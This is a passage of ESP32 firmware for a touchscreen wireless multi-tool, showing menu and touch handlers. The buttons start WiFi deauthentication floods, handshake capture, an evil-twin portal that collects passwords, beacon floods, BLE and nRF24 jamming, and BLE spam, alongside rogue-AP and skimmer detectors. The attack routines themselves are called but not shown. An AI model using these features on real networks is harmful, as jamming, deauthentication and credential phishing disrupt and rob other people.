        handleWiFiSnifferSubmenuTouch(touchX, touchY);
        break;
        
      case BLE_SNIFFER_SUBMENU:   // ← NEW
        handleBLESnifferSubmenuTouch(touchX, touchY);
        break;

      case CONTROL_SNIFFER_ACTIVE:
        handleControlSnifferTouch(touchX, touchY);
        break;
        
      case DATA_SNIFFER_ACTIVE:
        handleDataSnifferTouch(touchX, touchY);
        break;
      
      case BT_CLASSIC_SNIFFER_ACTIVE:
        handleBTClassicSnifferTouch(touchX, touchY);
        break;

      case WIFI_BLE_NRF_JAM:
        // Handle both deauth flood and combined jammer
        if (deauthFloodActive) {
          stopDeauthFlood();
        } else if (nrfJammerActive || bleJammerActive) {
          stopCombinedJammer();
        }
        currentState = WIFI_MENU;
        drawWiFiMenu();
        break;
        
      case SNIFFER_ACTIVE:
        Serial.println("\n[!] ===== SNIFFER STOP INITIATED =====");
        esp_wifi_set_promiscuous(false);
        snifferActive = false;
        currentState = FRAME_SNIFFER_SUBMENU;  // ← CHANGED
        delay(50);
        tft.fillScreen(COLOR_BG);
        drawFrameSnifferSubmenu();  // ← CHANGED
        addToConsole("Sniffer stopped");
        Serial.println("[✓] ===== SNIFFER STOPPED =====\n");
        return;
        
      case HANDSHAKE_CAPTURE:
        // Just stop, don't redraw yet
        stopDeauth();
        esp_wifi_set_promiscuous(false);
        currentState = WIFI_ATTACK_MENU;
        drawAttackMenu();
        break;
        
      case CAPTURED_PASSWORDS:
        if (touchY > 300) {
          currentState = WIFI_ATTACK_MENU;
          hoveredIndex = -1;
          drawAttackMenu();
        } else {
          int listY = HEADER_HEIGHT + 40;
          if (touchY > listY && touchY < 280) { 
            if (credDisplayOffset + MAX_DISPLAY_CREDS < capturedCredCount) {
              credDisplayOffset++;
              displayCapturedPasswords();
            }
          } else if (touchY < listY && credDisplayOffset > 0) { 
            credDisplayOffset--;
            displayCapturedPasswords();
          }
        }
        break;
        
      case BLE_MENU:
        handleBLEMenuTouch(touchX, touchY);
        break;
        
      case BLE_SCAN_RESULTS:
        {
          const int BACK_BUTTON_Y = 305;
          const int SAFE_BOTTOM = BACK_BUTTON_Y - 25;
          const int listY = HEADER_HEIGHT + 37;
          const int ITEM_HEIGHT = 26;
          const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
          
          if (touchY > 300) {
            // Stop scan and go back
            continuousBLEScan = false;
            if (pBLEScan != nullptr) {
              pBLEScan->stop();
              BLEDevice::deinit(false);
            }
            currentState = BLE_MENU;
            hoveredIndex = -1;
            delay(100);
            drawBLEMenu();
          } else if (touchY >= SAFE_BOTTOM && touchY < 300 && bleDeviceCount > MAX_ITEMS) {
            // Scroll to next page
            bleScrollOffset += MAX_ITEMS;
            if (bleScrollOffset >= bleDeviceCount) {
              bleScrollOffset = 0; // Wrap to start
            }
            displayBLEScanResults();
          }
        }
        break;
        
      case BLE_JAM_MENU:
        handleBLEJamMenuTouch(touchX, touchY);
        break;
        
      case BLE_JAM_ACTIVE:
        stopBLEJammer();
        currentState = BLE_JAM_MENU;
        hoveredIndex = -1;
        drawBLEJammerMenu();
        break;
        
      case SPAM_MENU:
        handleSpamMenuTouch(touchX, touchY);
        break;
        
      case NRF_JAM_MENU:
        handleNRFJamMenuTouch(touchX, touchY);
        break;
        
      case NRF_JAM_ACTIVE:
        // ANY tap stops jammer and goes back
        stopNRFJammer();
        currentState = NRF_JAM_MENU;
        hoveredIndex = -1;
        drawNRFJammerMenu();
        break;
      
      case DEAUTH_SNIFFER_ACTIVE:
        // Direct handling - no menu needed
        handleDeauthSnifferMenuTouch(touchX, touchY);
        break;
        
      // ===== FIXED: AirTag Scanner =====
      case AIRTAG_SCANNER:
      case AIRTAG_RESULTS:
        if (touchY > 300) {
          // STOP SCAN FIRST, change state, THEN draw
          if (pBLEScan != nullptr) {
            pBLEScan->stop();
            BLEDevice::deinit(false);
          }
          currentState = MORE_TOOLS_MENU;
          hoveredIndex = -1;
          delay(100);
          drawMoreToolsMenu();
        } else if (touchY >= HEADER_HEIGHT + 40 && touchY < 280 && airTagCount > 0) {
          // Scroll through results
          const int MAX_AIRTAG_DISPLAY = 9;
          int totalPages = (airTagCount + MAX_AIRTAG_DISPLAY - 1) / MAX_AIRTAG_DISPLAY;
          
          if (totalPages > 1) {
            int currentPage = airtagScrollOffset / MAX_AIRTAG_DISPLAY;
            currentPage = (currentPage + 1) % totalPages;
            airtagScrollOffset = currentPage * MAX_AIRTAG_DISPLAY;
            displayAirTagResults();
          }
        }
        break;

        case KARMA_DETECTOR:
        handleKarmaDetectorTouch(touchX, touchY);
        break;
        
      // ===== FIXED: Skimmer Detector =====
      case SKIMMER_DETECTOR:
      case SKIMMER_RESULTS:
        if (touchY > 300) {
          // STOP SCAN FIRST, change state, THEN draw
          if (pBLEScan != nullptr) {
            pBLEScan->stop();
            BLEDevice::deinit(false);
          }
          currentState = MORE_TOOLS_MENU;  // Change state BEFORE drawing
          hoveredIndex = -1;
          delay(100);  // Ensure scan stops
          drawMoreToolsMenu();
        }
        break;
        
      // ===== FIXED: Wardriving =====
      case ROGUE_AP_DETECTOR:
        if (touchY > 300) {
          // Stop scan
          stopRogueAPDetector();
          currentState = MORE_TOOLS_MENU;
          hoveredIndex = -1;
          delay(100);
          drawMoreToolsMenu();
        } else if (rogueAPCount > 0 && touchY > HEADER_HEIGHT + 40 && touchY < 280) {
          // Scroll through rogue APs
          const int MAX_ROGUE_DISPLAY = 7;
          int totalPages = (rogueAPCount + MAX_ROGUE_DISPLAY - 1) / MAX_ROGUE_DISPLAY;
          
          if (totalPages > 1) {
            int currentPage = rogueScrollOffset / MAX_ROGUE_DISPLAY;
            currentPage = (currentPage + 1) % totalPages;
            rogueScrollOffset = currentPage * MAX_ROGUE_DISPLAY;
            displayRogueAPDetector();
          }
        }
        break;

      case WARDRIVING_MODE:
        if (touchY > 300) {
          WiFi.scanDelete();
          currentState = MORE_TOOLS_MENU;
          hoveredIndex = -1;
          delay(100);
          drawMoreToolsMenu();
        }
        break;
        
      case MORE_TOOLS_MENU:
        handleMoreToolsTouch(touchX, touchY);
        break;
        
      case CONSOLE_VIEW:
        if (touchY > 300) {
          currentState = previousState;
          if (previousState == MAIN_MENU) {
            drawMainMenu();
          } else if (previousState == MORE_TOOLS_MENU) {
            drawMoreToolsMenu();
          }
        }
        break;
      
      case SETTINGS_MENU:
        handleSettingsMenuTouch(touchX, touchY);
        break;
        
      case DEVICE_INFO:
        if (touchY > 300) {
          currentState = SETTINGS_MENU;
          hoveredIndex = -1;
          drawSettingsMenu();
        }
        break;
        
      case ASCII_ART_VIEWER:
        // Any tap exits
        currentState = SETTINGS_MENU;
        hoveredIndex = -1;
        drawSettingsMenu();
        break;
    }
  }
}

void handleBackButton() {
  // Stop continuous scans
  if (continuousWiFiScan) {
    continuousWiFiScan = false;
    WiFi.scanDelete();
  }
  
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
      BLEDevice::deinit(false);
    }
  }
  
  // Stop active operations
  if (currentState == BLE_JAM_ACTIVE) stopBLEJammer();
  if (currentState == NRF_JAM_ACTIVE) stopNRFJammer();

  if (currentState == SNIFFER_ACTIVE) {
    stopSniffer();
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  if (currentState == WIFI_BLE_NRF_JAM) {
    stopCombinedJammer();
    return;
  }
  
  // Navigation logic
  switch (currentState) {
    // Top level menus go back to main
    case WIFI_MENU:
    case BLE_MENU:
    case RF_MENU:  // ✅ ADD THIS
    case MORE_TOOLS_MENU:
      currentState = MAIN_MENU;
      hoveredIndex = -1;
      drawMainMenu();
      break;
      
    // RF submenu items go back to RF Type menu
    case RF_TYPE_MENU:  // ✅ ADD THIS
      currentState = RF_MENU;
      hoveredIndex = -1;
      drawRFMenu();
      break;
      
    case RF_MONITOR:  // ✅ ADD THIS
    case RF_CAPTURE:  // ✅ ADD THIS
    case RF_REPLAY:   // ✅ ADD THIS
    case NRF_JAM_MENU:  // ✅ FIXED: Now goes to RF_TYPE_MENU
      if (nrfJammerActive) stopNRFJammer();
      if (rfCaptureActive) stopRFCapture();
      currentState = RF_TYPE_MENU;  // ✅ FIXED!
      hoveredIndex = -1;
      drawRFTypeMenu();  // ✅ FIXED!
      break;
      
    // WiFi submenu items go back to WiFi menu
    case WIFI_SCAN:
    case SELECT_TARGET:
    case WIFI_ATTACK_MENU:
    case BEACON_MANAGER:
    case CAPTURED_PASSWORDS:
    case HANDSHAKE_CAPTURE:
      if (deauthActive) stopDeauth();
      if (portalActive) stopCaptivePortal();
      if (currentState == HANDSHAKE_CAPTURE) {
        esp_wifi_set_promiscuous(false);
      }
      currentState = WIFI_MENU;
      hoveredIndex = -1;
      drawWiFiMenu();
      break;
      
    // Beacon add goes back to beacon manager
    case BEACON_ADD:
      currentState = BEACON_MANAGER;
      hoveredIndex = -1;
      drawBeaconManager();
      break;
      
    // BLE submenu items go back to BLE menu
    case BLE_SCAN_RESULTS:
      continuousBLEScan = false;
      if (pBLEScan != nullptr) {
        pBLEScan->stop();
        BLEDevice::deinit(false);
      }
      currentState = BLE_MENU;
      hoveredIndex = -1;
      drawBLEMenu();
      break;
      
    case BLE_JAM_MENU:
      if (bleJammerActive) stopBLEJammer();
      currentState = BLE_MENU;
      hoveredIndex = -1;
      drawBLEMenu();
      break;
      
    case SPAM_MENU:
      // Stop any active spam
      if (appleSpamActive || androidSpamActive) {
        if (BLEDevice::getInitialized()) {
          BLEDevice::deinit(false);
        }
        appleSpamActive = false;
        androidSpamActive = false;
      }
      currentState = BLE_MENU;
      hoveredIndex = -1;
      drawBLEMenu();
      break;

    case DEAUTH_SNIFFER:
      if (deauthSnifferActive) stopDeauthSniffer();
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;

    case DEAUTH_SNIFFER_ACTIVE:
      stopDeauthSniffer();
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;
      
    case AIRTAG_SCANNER:
    case AIRTAG_RESULTS:
      if (pBLEScan != nullptr) {
        pBLEScan->stop();
        BLEDevice::deinit(false);
      }
      currentState = MORE_TOOLS_MENU;  // ✅ CHANGED from BLE_MENU
      hoveredIndex = -1;
      drawMoreToolsMenu();  // ✅ CHANGED from drawBLEMenu()
      break;
      
    case SKIMMER_DETECTOR:
    case SKIMMER_RESULTS:
      if (pBLEScan != nullptr) {
        pBLEScan->stop();
        BLEDevice::deinit(false);
      }
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;
      
    case WARDRIVING_MODE:
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;
      
    case ROGUE_AP_DETECTOR:
      if (rogueAPScanActive) stopRogueAPDetector();
      currentState = MORE_TOOLS_MENU;
      hoveredIndex = -1;
      drawMoreToolsMenu();
      break;
      
    case CONSOLE_VIEW:
      currentState = previousState;
      if (previousState == MAIN_MENU) {
        drawMainMenu();
      } else if (previousState == MORE_TOOLS_MENU) {
        drawMoreToolsMenu();
      } else if (previousState == SETTINGS_MENU) {
        drawSettingsMenu();
      }
      break;
      
    case SETTINGS_MENU:
    case DEVICE_INFO:
    case ASCII_ART_VIEWER:
      currentState = MAIN_MENU;
      hoveredIndex = -1;
      drawMainMenu();
      break;
    
    case SNIFFER_MENU:
      currentState = MAIN_MENU;
      hoveredIndex = -1;
      drawMainMenu();
      break;

    case FRAME_SNIFFER_SUBMENU:
      currentState = WIFI_SNIFFER_SUBMENU;
      hoveredIndex = -1;
      drawWiFiSnifferSubmenu();
      break;

    case PROBE_SNIFFER_ACTIVE:
      stopProbeRequestSniffer();
      currentState = WIFI_SNIFFER_SUBMENU;  // ← CHANGED
      hoveredIndex = -1;
      drawWiFiSnifferSubmenu();
      break;

    case MGMT_SNIFFER_ACTIVE:
      stopManagementFrameSniffer();
      currentState = FRAME_SNIFFER_SUBMENU;  // ← CHANGED
      hoveredIndex = -1;
      drawFrameSnifferSubmenu();
      break;

    case BEACON_ANALYZER_ACTIVE:
      stopBeaconAnalyzer();
      currentState = WIFI_SNIFFER_SUBMENU;  // ← CHANGED
      hoveredIndex = -1;
      drawWiFiSnifferSubmenu();
      break;
      
    case BLE_SNIFFER_ACTIVE:
      stopBLEFrameSniffer();
      currentState = BLE_SNIFFER_SUBMENU;   // ← CHANGED: Go back to BLE submenu
      hoveredIndex = -1;
      drawBLESnifferSubmenu();
      break;
      
    case CONTROL_SNIFFER_ACTIVE:
      stopControlFrameSniffer();
      currentState = FRAME_SNIFFER_SUBMENU;  // ← CHANGED
      hoveredIndex = -1;
      drawFrameSnifferSubmenu();
      break;

    case DATA_SNIFFER_ACTIVE:
      stopDataFrameSniffer();
      currentState = FRAME_SNIFFER_SUBMENU;  // ← CHANGED
      hoveredIndex = -1;
      drawFrameSnifferSubmenu();
      break;

    case SNIFFER_ACTIVE:
      stopSniffer();
      currentState = FRAME_SNIFFER_SUBMENU;  // ← CHANGED
      hoveredIndex = -1;
      drawFrameSnifferSubmenu();
      break;

      
    default:
      currentState = MAIN_MENU;
      hoveredIndex = -1;
      drawMainMenu();
      break;
  }
}

// Calculate which button was pressed based on Y coordinate
int getTouchedButtonIndex(int touchY, int startY) {
  if (touchY < startY) return -1;
  int relativeY = touchY - startY;
  int buttonIndex = relativeY / (BUTTON_HEIGHT + BUTTON_SPACING);
  
  // Check if touch is actually within button bounds (not in spacing)
  int buttonY = startY + (buttonIndex * (BUTTON_HEIGHT + BUTTON_SPACING));
  if (touchY >= buttonY && touchY <= buttonY + BUTTON_HEIGHT) {
    return buttonIndex;
  }
  return -1;
}

void handleMainMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (6 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // WiFi Tools
          currentState = WIFI_MENU;
          hoveredIndex = -1;
          drawWiFiMenu();
          break;
        case 1: // Bluetooth Tools
          currentState = BLE_MENU;
          hoveredIndex = -1;
          drawBLEMenu();
          break;
        case 2: // Radio Frequency Tools
          currentState = RF_MENU;
          hoveredIndex = -1;
          drawRFMenu();
          break;
        case 3: // Defensive Tools
          currentState = MORE_TOOLS_MENU;
          hoveredIndex = -1;
          drawMoreToolsMenu();
          break;
        case 4: // Sniffer Tools
          currentState = SNIFFER_MENU;
          hoveredIndex = -1;
          drawSnifferMenu();
          break;
        case 5: // Settings
          currentState = SETTINGS_MENU;
          hoveredIndex = -1;
          drawSettingsMenu();
          break;
      }
    }
  }
}

void handleSettingsMenuTouch(int x, int y) {
  // Back button
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  // Calculate which menu item was touched
  if (y >= startY && y < startY + (5 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // Changed from 4 to 5
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    // Verify touch is within button bounds (not in spacing)
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y < buttonY || y > buttonY + MENU_ITEM_HEIGHT) return;
    
    // Ensure index is valid
    if (buttonIndex < 0 || buttonIndex > 4) return;  // Changed from 3 to 4
    
    switch (buttonIndex) {
      case 0: // Device Info
        currentState = DEVICE_INFO;
        hoveredIndex = -1;
        drawDeviceInfo();
        break;
        
      case 1: // SD Card
        Serial.println("SD Card initializing...");
        break;
        
      case 2: // Show ASCII Art
        currentState = ASCII_ART_VIEWER;
        drawASCIIArtViewer();
        break;
        
      case 3: // Console ← NEW
        showConsole();
        break;
        
      case 4: // Reboot
        Serial.println("\n[*] Rebooting device...");
        addToConsole("Rebooting...");
        delay(1000);
        ESP.restart();
        break;
    }
  }
}

void handleWiFiMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  
  // Back button check first (bottom of screen)
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  // Calculate menu item
  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // Scan Networks
          startContinuousWiFiScan();
          break;
        case 1: // Select Target
          if (networkCount > 0) {
            currentState = SELECT_TARGET;
            hoveredIndex = -1;
            drawSelectTargetMenu();
          } else {
            showMessage("Scan networks first!", COLOR_ORANGE);
            delay(500);
            drawWiFiMenu();
          }
          break;
        case 2: // Beacon Manager
          currentState = BEACON_MANAGER;
          beaconDisplayOffset = 0;
          hoveredIndex = -1;
          drawBeaconManager();
          break;
        case 3: // Deauth Flood
          if (networkCount > 0) {
            // CRITICAL: Must scan first to have targets
            startDeauthFlood();
          } else {
            showMessage("Scan networks first!", COLOR_ORANGE);
            delay(1000);
            drawWiFiMenu();
          }
          break;
      }
    }
  }
}

void checkHeapHealth() {
  static unsigned long lastCheck = 0;
  
  if (millis() - lastCheck < 5000) return;
  lastCheck = millis();
  
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t minHeap = ESP.getMinFreeHeap();
  
  // Warning level
  if (freeHeap < 40000) {
    Serial.printf("[!] LOW MEMORY: %d bytes free (min: %d)\n", freeHeap, minHeap);
    addToConsole("WARN: Low memory");
  }
  
  // Critical level - emergency cleanup
  if (freeHeap < 25000) {
    Serial.println("[!!!] CRITICAL MEMORY - EMERGENCY CLEANUP");
    addToConsole("CRITICAL: Out of memory!");
    
    // Stop all operations
    if (deauthActive) stopDeauth();
    if (bleJammerActive) stopBLEJammer();
    if (nrfJammerActive) stopNRFJammer();
    if (snifferActive) stopSniffer();
    if (portalActive) stopCaptivePortal();
    if (appleSpamActive) stopAppleSpam();
    if (androidSpamActive) stopAndroidSpam();
    
    // Clear buffers
    for (int i = 0; i < 15; i++) {
      consoleBuffer[i] = "";
    }
    
    delay(500);
    
    Serial.printf("[*] After cleanup: %d bytes free\n", ESP.getFreeHeap());
    
    // Return to main menu
    currentState = MAIN_MENU;
    drawMainMenu();
  }
}

void handleBeaconManagerTouch(int x, int y) {
  if (y > 300) {
    if (beaconFloodActive) {
      beaconFloodActive = false;
      esp_wifi_stop();
      delay(100);
      WiFi.mode(WIFI_STA);
    }
    currentState = WIFI_MENU;
    hoveredIndex = -1;
    drawWiFiMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex == 0) {
    currentState = BEACON_ADD;
    beaconInputSSID = "";
    drawBeaconAddScreen();
    return;
  } else if (buttonIndex == 1) {
    if (customBeaconCount == 0) {
      addToConsole("WARN: Add beacons first");
      drawBeaconManager();
      return;
    }
    beaconFloodActive = !beaconFloodActive;
    if (beaconFloodActive) {
      addToConsole("Custom beacon flood started");
    } else {
      addToConsole("Beacon flood stopped");
      esp_wifi_stop();
      delay(100);
      WiFi.mode(WIFI_STA);
    }
    drawBeaconManager();
    return;
  }
  
  int listStartY = HEADER_HEIGHT + 10 + (2 * (BUTTON_HEIGHT + BUTTON_SPACING)) + 55;
  int deleteX = SCREEN_WIDTH - SIDE_MARGIN - 35;
  
  if (x >= deleteX && x <= deleteX + 30) {
    int itemIndex = (y - listStartY) / 22;
    if (itemIndex >= 0 && itemIndex < MAX_DISPLAY_BEACONS) {
      int actualIndex = beaconDisplayOffset + itemIndex;
      if (actualIndex < customBeaconCount) {
        deleteBeacon(actualIndex);
        drawBeaconManager();
      }
    }
  }
  
  int scrollY = listStartY + (MAX_DISPLAY_BEACONS * 22) + 3;
  if (y >= scrollY && y <= scrollY + 15 && customBeaconCount > MAX_DISPLAY_BEACONS) {
    beaconDisplayOffset = (beaconDisplayOffset + MAX_DISPLAY_BEACONS) % customBeaconCount;
    drawBeaconManager();
  }
}

void handleBLEMenuTouch(int x, int y) {
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (2 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // ← Changed to 2
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:  // BT Scan
          scanBLEDevices();
          break;
        case 1:  // BLE Beacon Spam
          currentState = SPAM_MENU;
          hoveredIndex = -1;
          drawSpamMenu();
          break;
      }
    }
  }
}

void handleBLEJamMenuTouch(int x, int y) {
  if (y > 300) {
    if (bleJammerActive) stopBLEJammer();
    currentState = BLE_MENU;
    hoveredIndex = -1;
    drawBLEMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + MENU_ITEM_HEIGHT) {
    if (!bleJammerActive) {
      startBLEJammer();
    } else {
      stopBLEJammer();
      drawBLEJammerMenu();
    }
  }
}

void handleNRFJamMenuTouch(int x, int y) {
  if (y > 300) {
    // Back button pressed
    if (nrfJammerActive) stopNRFJammer();
    currentState = RF_TYPE_MENU;
    hoveredIndex = -1;
    drawRFTypeMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:  // Start/Stop Jammer
          if (!nrfJammerActive) {
            if (!nrf1Available && !nrf2Available) {
              showMessage("No nRF24 modules!", COLOR_WARNING);
              delay(1500);
              drawNRFJammerMenu();
              return;
            }
            startNRFJammer();
          } else {
            stopNRFJammer();
            delay(100);
            drawNRFJammerMenu();
          }
          break;
          
        case 1:  // Toggle Dual Mode
          if (nrf1Available && nrf2Available) {
            dualNRFMode = !dualNRFMode;
            addToConsole(dualNRFMode ? "Dual mode ON" : "Single mode");
            Serial.printf("[*] Dual mode: %s\n", dualNRFMode ? "ON" : "OFF");
          } else {
            addToConsole("ERROR: Need 2 radios");
            Serial.println("[!] Need 2 radios for dual mode");
          }
          drawNRFJammerMenu();
          break;
          
        case 2:  // Cycle Mode
          nrfJamMode = (NRFJamMode)((nrfJamMode + 1) % 4);
          
          const char* modeName = "";
          switch (nrfJamMode) {
            case NRF_SWEEP:   modeName = "SWEEP (Smoochiee)"; break;
            case NRF_RANDOM:  modeName = "RANDOM"; break;
            case NRF_FOCUSED: modeName = "FOCUSED (BLE)"; break;
            case NRF_WIFI_CLOWN: modeName = "WIFI CLOWN"; break;
          }
          
          addToConsole(String("Mode: ") + modeName);
          Serial.printf("[*] Jamming mode: %s\n", modeName);
          
          if (nrfJammerActive) {
            flag_radio1 = 0;
            flag_radio2 = 0;
            nrf_ch1 = 2;
            nrf_ch2 = 45;
          }
          
          drawNRFJammerMenu();
          break;
      }
    }
  }
}

void handleSpamMenuTouch(int x, int y) {
  if (y > 300) {
    // Clean stop
    if (appleSpamActive) stopAppleSpam();
    if (androidSpamActive) stopAndroidSpam();
    
    currentState = BLE_MENU;
    hoveredIndex = -1;
    drawBLEMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:  // Apple Spam
          if (!appleSpamActive) {
            if (androidSpamActive) stopAndroidSpam();
            startAppleSpam();
          } else {
            stopAppleSpam();
          }
          drawSpamMenu();
          break;
          
        case 1:  // Android Spam
          if (!androidSpamActive) {
            if (appleSpamActive) stopAppleSpam();
            startAndroidSpam();
          } else {
            stopAndroidSpam();
          }
          drawSpamMenu();
          break;
          
        case 2:  // Combined Spam
          if (!appleSpamActive || !androidSpamActive) {
            startCombinedSpam();
          } else {
            stopAppleSpam();
            stopAndroidSpam();
          }
          drawSpamMenu();
          break;
      }
    }
  }
}

void handleMoreToolsTouch(int x, int y) {
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (5 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:  // Rogue AP Detector
          startRogueAPDetector();
          break;
        case 1:  // Deauth Detector
          startDeauthSniffer();
          break;
        case 2:  // Karma/Evil Twin
          startKarmaDetector();
          break;
        case 3:  // AirTag Detector
          startAirTagScanner();
          break;
        case 4:  // Wardriving
          startWardriving();
          break;
      }
    }
  }
}

void handleWiFiScanTouch(int x, int y) {
  if (y > 300) {
    continuousWiFiScan = false;
    WiFi.scanDelete();
    currentState = WIFI_MENU;
    hoveredIndex = -1;
    drawWiFiMenu();
    return;
  }
  
  int listY = HEADER_HEIGHT + 35;
  const int BACK_BUTTON_Y = 305;
  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25;
  const int ITEM_HEIGHT = 22;
  const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
  
  // Check if touch is in list area
  if (y >= listY && y < SAFE_BOTTOM) {
    int clickedIndex = (y - listY) / ITEM_HEIGHT;
    int actualIndex = wifiScrollOffset + clickedIndex;
    
    if (actualIndex >= 0 && actualIndex < networkCount) {
      selectedSSID = networks[actualIndex].ssid;
      selectedIndex = actualIndex;
      continuousWiFiScan = false;
      WiFi.scanDelete();
      currentState = WIFI_ATTACK_MENU;
      drawAttackMenu();
      addToConsole("Target: " + selectedSSID);
    }
  }
  // Scroll functionality - tap scroll indicator area
  else if (y >= SAFE_BOTTOM && y < 300 && networkCount > MAX_ITEMS) {
    wifiScrollOffset += MAX_ITEMS;
    if (wifiScrollOffset >= networkCount) {
      wifiScrollOffset = 0; // Wrap to start
    }
    displayContinuousWiFiScan();
  }
}

void handleAttackMenuTouch(int x, int y) {
  if (y > 300) {
    if (deauthActive) stopDeauth();
    if (portalActive) stopCaptivePortal();
    if (currentState == HANDSHAKE_CAPTURE) {
      esp_wifi_set_promiscuous(false);
    }
    currentState = WIFI_MENU;
    hoveredIndex = -1;
    drawWiFiMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 25;
  
  if (y >= startY && y < startY + (6 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:
          if (portalActive) stopCaptivePortal();
          if (currentState == HANDSHAKE_CAPTURE) {
            esp_wifi_set_promiscuous(false);
            currentState = WIFI_ATTACK_MENU;
          }
          currentDeauthMethod = 0;
          startDeauth();
          delay(300);
          drawAttackMenu();
          break;
          
        case 1:
          if (portalActive) stopCaptivePortal();
          if (currentState == HANDSHAKE_CAPTURE) {
            esp_wifi_set_promiscuous(false);
            currentState = WIFI_ATTACK_MENU;
          }
          currentDeauthMethod = 1;
          startDeauth();
          delay(300);
          drawAttackMenu();
          break;
          
        case 2:
          lastAttackTime = millis();
          startHandshakeCapture();
          break;
          
        case 3:
          startEvilTwin();
          drawAttackMenu();
          break;
          
        case 4:
          credDisplayOffset = 0;
          displayCapturedPasswords();
          break;
          
        case 5:
          stopDeauth();
          if (portalActive) stopCaptivePortal();
          if (currentState == HANDSHAKE_CAPTURE) {
            esp_wifi_set_promiscuous(false);
            currentState = WIFI_ATTACK_MENU;
          }
          drawAttackMenu();
          break;
      }
    }
  }
}

void loop() {
  esp_task_wdt_reset();

  if (karmaDetectorActive) {
    updateKarmaDetector();
  }

  // Probe Request Sniffer with channel hopping
if (probeSnifferActive) {
  static unsigned long lastProbeHop = 0;
  static unsigned long lastProbeUpdate = 0;
  
  // Fast channel hopping - 150ms per channel
  if (millis() - lastProbeHop > 150) {
    snifferChannel = (snifferChannel % 13) + 1;
    esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
    lastProbeHop = millis();
  }
  
  // Update display every 300ms
  if (millis() - lastProbeUpdate > 300) {
    displayProbeRequestSniffer();
    lastProbeUpdate = millis();
  }
